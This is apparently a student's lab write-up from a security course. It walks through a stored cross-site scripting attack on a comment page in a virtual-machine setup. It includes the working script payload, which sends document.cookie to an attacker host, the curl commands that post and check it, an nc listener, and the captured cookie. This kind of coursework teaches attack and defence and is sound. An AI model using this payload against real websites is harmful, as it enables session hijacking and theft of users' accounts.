Steps:

(1) To extract user's cookie, we need embed a piece of javscript that contains:

    1) document.cookie to extract user's cookie;
    2) a target link to which the user's cookie will be sent.

(2) In terms of the previous idea, I constructed the following comment:

    <script>document.write("<img src=\"http://192.168.15.3:13880?c="+document.cookie+"\" />")</script>

    and post the comment to the SERVER using the following command:

    curl -k -v -d comment="<script>document.write(\"<img src=\\\"http://192.168.15.3:13880?c=\"%2Bdocument.cookie%2B\"\\\" />\")</script>" https://192.168.15.1/comment/

    From the response, the new comment's link is on the page and new comment's id is 39. 

(3) Check the comment 39 on the web page by running the following command: 

    curl -k -v https://192.168.15.1/comment/comment.php?c_id=39  

    and get the following content from the response:

    <h1>Comment 39</h1><strong>Comment</strong>: <script>document.write("<img src=\"http://192.168.15.3:13880?c="+document.cookie+"\" />")</script>

    Notice that the javascript snippet is on the web page and embedded in the comment part.
    If the CLIENT accesses this web page, then the CLIENT will send cookie to the embedded link.

(4) To receive the cookie from the CLIENT, we need listen port 13880 on ATTACKER VM:

    nc -l 13880

    Then run the following command on ATTACKER VM to ask CLIENT to access the comment 39:

    curl -k -v https://192.168.15.2/5/39

    ATTACKER receives the following content sent by the CLIENT: 

    student@xenial64s:~/hy/p2$ nc -l 13880
    GET /?c=auth=Iwillseeyouagainin44years. HTTP/1.1
    Host: 192.168.15.3:13880
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0
    Accept: image/png,image/*;q=0.8,*/*;q=0.5
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: keep-alive

    From the url parameter, we can extract the CLIENT's cookie:

    auth=Iwillseeyouagainin44years. 
